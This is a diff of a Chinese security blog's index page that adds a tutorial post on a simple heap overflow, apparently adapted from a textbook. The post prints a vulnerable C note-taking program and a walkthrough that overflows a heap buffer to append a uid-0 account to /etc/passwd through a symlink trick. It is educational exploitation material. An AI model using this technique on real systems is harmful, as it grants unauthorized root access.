@@ -318,6 +318,154 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/10/28/堆溢出利用笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/10/28/堆溢出利用笔记/" itemprop="url">
+                  一个简单的堆溢出
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-28T11:18:28+08:00">
+                2017-10-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line"></div><div class="line">void usage(char *prog_name, char *filename) &#123;</div><div class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</div><div class="line">   exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   int userid, fd; // file descriptor</div><div class="line">   char *buffer, *datafile;</div><div class="line"></div><div class="line">   buffer = (char *) malloc(100);</div><div class="line">   datafile = (char *) malloc(20);</div><div class="line">   strcpy(datafile, &quot;/var/notes&quot;);</div><div class="line"></div><div class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</div><div class="line">      usage(argv[0], datafile); // display usage message and exit</div><div class="line"></div><div class="line">   strcpy(buffer, argv[1]);  // copy into buffer</div><div class="line"></div><div class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</div><div class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</div><div class="line"></div><div class="line"> // Opening the file</div><div class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</div><div class="line">   if(fd == -1)</div><div class="line">      printf(&quot;in main() while opening file&quot;);</div><div class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</div><div class="line"></div><div class="line">   userid = getuid(); // get the real user ID</div><div class="line"></div><div class="line">// Writing data</div><div class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</div><div class="line">      printf(&quot;in main() while writing userid to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</div><div class="line">      printf(&quot;in main() while writing buffer to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">// Closing file</div><div class="line">   if(close(fd) == -1)</div><div class="line">      printf(&quot;in main() while closing file&quot;);</div><div class="line"></div><div class="line">   printf(&quot;Note has been saved.\n&quot;);</div><div class="line">   free(buffer);</div><div class="line">   free(datafile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><ul>
+<li>这段代码程序中有两个buffer是存放在堆上面的，这个程序会接收一个参数，并将参数最终写入到/var/notes 这个文件中。<br><img src="/2017/10/28/堆溢出利用笔记/notetaker.png" alt=""></li>
+<li>如图所示我们可以计算出两个buffer地址之间的距离是0x70（即112个字节），我们知道第一个buffer是以null为结束的，当我们写入这个buffer长度为112个字节的时候，那么第二个buffer将会被写入到datafile这个buffer开始的部分。<br><img src="/2017/10/28/堆溢出利用笔记/nulloverflow.png" alt=""></li>
+<li>如我们所预期的，第二个buffer被我们写入了空.那么如果被覆盖的不是null，而是其他的呢？会是什么情况<br><img src="/2017/10/28/堆溢出利用笔记/testfile.png" alt=""></li>
+<li>这次，溢出导致第一个buffer写入到了当前文件下的testfile文件中，而不再是/var/notes 这个文件中 ，可以看到当使用free释放内存的时候报错了，这个其实就类似于栈溢出覆盖了返回地址一样。<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4></li>
+<li>从上面可以看出，文件名可以控制，而且可以append到文件中。这里可能会有几种利用的方式，其中最常见的利用方式就是写文件/etc/passwd，这个文件包含了系统的所有的用户名、ID、登录的shell等信息(对这个文件操作之前请注意先备份O！)</li>
+<li>这个文件是以分号分隔开的，依次是登录名、密码、用户ID、组ID，用户名、用户的根目录以及登录的shell，其中密码处可以是x(代表加密，存放在/etc/shadow文件中)，也可以直接是加密后的密文，此外用户id为0代表用户会是root的权限，这个时候我们的目标就是在这个文件中追加一条，一个带有密文且id为0的账号。</li>
+<li>关于密码加密我们可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ perl -e &apos;print crypt(&quot;M0rk&quot;, &quot;AA&quot;). &quot;\n&quot;&apos;</div><div class="line">AAhmo1jgYI0HE</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>所以我们最终想要在passwd文件中的条目大概是这个样子的<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/bin/bash</p>
+<ul>
+<li><p>然而，这个特殊的堆溢出并不允许我们直接这么操作，因为我们必须以/etc/passwd为结束，但是这个限制我们可以使用符号链接来”绕过”,”绕过”方法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ mkdir /tmp/etc</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ln -s /bin/bash /tmp/etc/passwd</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ ls -l /tmp/etc/passwd</div><div class="line">lrwxrwxrwx 1 xxx xxx 9 Nov 16 20:56 /tmp/etc/passwd -&gt; /bin/bash</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个时候/tmp/etc/passwd指向了/bin/bash,这就意味着我们有了可登陆的shell，这个时候就变成了<br>myroot:AAhmo1jgYI0HE:0:0:me:/root:/tmp/etc/passwd</p>
+</li>
+<li>此外这里还需要计算一下me这里需要填充多长才能满足112个字节。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ echo &quot;myroot:AAhmo1jgYI0HE:0:0::/root:/tmp&quot; |wc -c</div><div class="line">37</div><div class="line">xxx@ubuntu:~/Desktop/heapoverflow$ bc</div><div class="line">bc 1.06.95</div><div class="line">Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.</div><div class="line">This is free software with ABSOLUTELY NO WARRANTY.</div><div class="line">For details type `warranty&apos;. </div><div class="line">112-37+1</div><div class="line">76</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/28/堆溢出利用笔记/final.png" alt=""></p>
+<ul>
+<li>如上图所示，通过堆溢出成功添加了账号并登陆。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这里只是举例了一个发生在堆内存上的溢出漏洞，并没有涉及到像是unlink或者UAF等技巧（后面有时间再研究分享），但像是通过写/etc/passwd以及软链接的trick还是不错的。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li>《hacking the art of exploitation》chapter 0x340<br><a href="http://www.freebuf.com/articles/system/151407.html" target="_blank" rel="external">Dance In Heap（二）：一些堆利用的方法（上） </a><br><a href="http://yunnigu.dropsec.xyz/2017/04/05/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B9%8Bunlink%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="external">堆溢出之unlink的利用</a><br><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.71405f33KyLlt6&amp;articleid=315" target="_blank" rel="external">Linux堆内存管理深入分析</a></li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/10/25/20171025安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -675,7 +823,7 @@
 <li>Apache Solr XML外部实体扩展(XXE)及远程代码执行(CVE-2017-12629)<br><a href="http://liehu.tass.com.cn/archives/861" target="_blank" rel="external">http://liehu.tass.com.cn/archives/861</a></li>
 <li>蜜罐与内网安全从0到1（一）<br><a href="https://sosly.me/index.php/2017/08/23/goldenspark1/" target="_blank" rel="external">https://sosly.me/index.php/2017/08/23/goldenspark1/</a></li>
 <li>CAT文件数字签名使用技巧<br><a href="https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/CAT%E6%96%87%E4%BB%B6%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</a></li>
-<li>看我如何发现Yahoo! Guesthouse 的SSRF漏洞<br><a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x68;&#x74;&#x74;&#112;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#x63;&#x6f;&#109;&#x2f;&#64;&#x74;&#104;&#x33;&#103;&#51;&#x6e;&#116;&#x33;&#x6c;&#x2f;&#x68;&#x6f;&#119;&#x2d;&#x69;&#45;&#102;&#111;&#117;&#x6e;&#100;&#x2d;&#x61;&#x6e;&#x2d;&#115;&#x73;&#x72;&#x66;&#x2d;&#105;&#x6e;&#45;&#121;&#x61;&#x68;&#x6f;&#111;&#x2d;&#103;&#117;&#101;&#x73;&#116;&#x68;&#111;&#x75;&#115;&#101;&#45;&#x72;&#x65;&#99;&#111;&#110;&#x2d;&#119;&#105;&#110;&#x73;&#45;&#x38;&#x37;&#50;&#x32;&#x36;&#55;&#x32;&#101;&#x34;&#x31;&#x64;&#x34;">&#x68;&#x74;&#x74;&#112;&#115;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#x63;&#x6f;&#109;&#x2f;&#64;&#x74;&#104;&#x33;&#103;&#51;&#x6e;&#116;&#x33;&#x6c;&#x2f;&#x68;&#x6f;&#119;&#x2d;&#x69;&#45;&#102;&#111;&#117;&#x6e;&#100;&#x2d;&#x61;&#x6e;&#x2d;&#115;&#x73;&#x72;&#x66;&#x2d;&#105;&#x6e;&#45;&#121;&#x61;&#x68;&#x6f;&#111;&#x2d;&#103;&#117;&#101;&#x73;&#116;&#x68;&#111;&#x75;&#115;&#101;&#45;&#x72;&#x65;&#99;&#111;&#110;&#x2d;&#119;&#105;&#110;&#x73;&#45;&#x38;&#x37;&#50;&#x32;&#x36;&#55;&#x32;&#101;&#x34;&#x31;&#x64;&#x34;</a></li>
+<li>看我如何发现Yahoo! Guesthouse 的SSRF漏洞<br><a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#x2f;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#64;&#x74;&#104;&#x33;&#x67;&#x33;&#x6e;&#116;&#x33;&#x6c;&#x2f;&#x68;&#111;&#x77;&#x2d;&#105;&#45;&#x66;&#111;&#x75;&#110;&#100;&#45;&#97;&#110;&#45;&#115;&#x73;&#x72;&#102;&#x2d;&#x69;&#110;&#x2d;&#121;&#x61;&#x68;&#x6f;&#x6f;&#45;&#x67;&#x75;&#x65;&#x73;&#116;&#x68;&#x6f;&#x75;&#115;&#101;&#45;&#114;&#101;&#99;&#111;&#110;&#45;&#119;&#105;&#110;&#x73;&#x2d;&#x38;&#55;&#x32;&#x32;&#54;&#x37;&#x32;&#101;&#x34;&#x31;&#x64;&#52;">&#104;&#116;&#116;&#x70;&#x73;&#58;&#x2f;&#x2f;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#64;&#x74;&#104;&#x33;&#x67;&#x33;&#x6e;&#116;&#x33;&#x6c;&#x2f;&#x68;&#111;&#x77;&#x2d;&#105;&#45;&#x66;&#111;&#x75;&#110;&#100;&#45;&#97;&#110;&#45;&#115;&#x73;&#x72;&#102;&#x2d;&#x69;&#110;&#x2d;&#121;&#x61;&#x68;&#x6f;&#x6f;&#45;&#x67;&#x75;&#x65;&#x73;&#116;&#x68;&#x6f;&#x75;&#115;&#101;&#45;&#114;&#101;&#99;&#111;&#110;&#45;&#119;&#105;&#110;&#x73;&#x2d;&#x38;&#55;&#x32;&#x32;&#54;&#x37;&#x32;&#101;&#x34;&#x31;&#x64;&#52;</a></li>
 <li><p>使用NtCreateThreadEx/QueueUserAPC/SetThreadContext/SetWindowsHookEx进行DLL注入<br><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1" target="_blank" rel="external">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">还没用过powershell这种语言进行dll注入</div></pre></td></tr></table></figure>
 </li>
@@ -1556,132 +1704,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/29/GTest测试框架/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/29/GTest测试框架/" itemprop="url">
-                  Google c++测试框架
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-29T23:34:40+08:00">
-                2017-09-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>测试并不只是测试工程师的责任，对于开发工程师，为了保证发布给测试环节的代码具有足够好的质量（ Quality ），为所编写的功能代码编写适量的单元测试是十分必要的。</li>
-<li>单元测试（ Unit Test ，模块测试）是开发者编写的一小段代码，用于检验被测代码的一个很小的、很明确的功能是否正确，通过编写单元测试可以在编码阶段发现程序编码错误，甚至是程序设计错误。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li><a href="https://usingcpp.wordpress.com/2016/07/23/google-test-and-visual-studio/" target="_blank" rel="external">https://usingcpp.wordpress.com/2016/07/23/google-test-and-visual-studio/</a></li>
-<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-cppunittest/index.html" target="_blank" rel="external">https://www.ibm.com/developerworks/cn/linux/l-cn-cppunittest/index.html</a></li>
-<li><a href="https://marketplace.visualstudio.com/items?itemName=VisualCPPTeam.TestAdapterforGoogleTest" target="_blank" rel="external">vs上使用googletest</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1731,7 +1753,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">164</span>
+                <span class="site-state-item-count">165</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
